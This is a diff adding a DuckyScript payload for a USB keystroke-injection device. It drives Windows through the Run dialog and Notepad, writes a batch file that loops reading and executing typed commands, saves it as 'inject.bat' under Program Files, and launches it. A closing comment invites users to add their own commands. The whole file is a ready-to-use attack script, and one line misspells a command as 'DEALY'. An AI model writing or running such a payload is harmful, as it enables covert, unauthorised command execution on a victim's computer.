@@ -1,0 +1,44 @@
+REM
+REM
+REM
+REM Code By: Hitchhiker and SPYder007
+REM Cleanup By: SPYder007
+REM Original code by: Hitchhiker
+REM
+REM
+REM
+DELAY 1000
+GUI r
+DELAY 250
+STRING notepad
+ENTER
+DELAY 100
+STRING :l
+ENTER
+DELAY 100
+STRING set /p c=
+ENTER
+DELAY 100 
+STRING %c%
+ENTER
+DELAY 100
+STRING goto l
+DELAY 100
+CTRL s
+DELAY 250
+STRING C:\Program Files\inject.bat
+DEALY 100
+ENTER
+DELAY 250
+ENTER
+DELAY 100
+ENTER
+DELAY 250
+ALT F4
+DELAY 250
+GUI r
+DELAY 250
+STRING inject.bat
+ENTER
+REM 
+REM Enter your code to execute here using STRING.
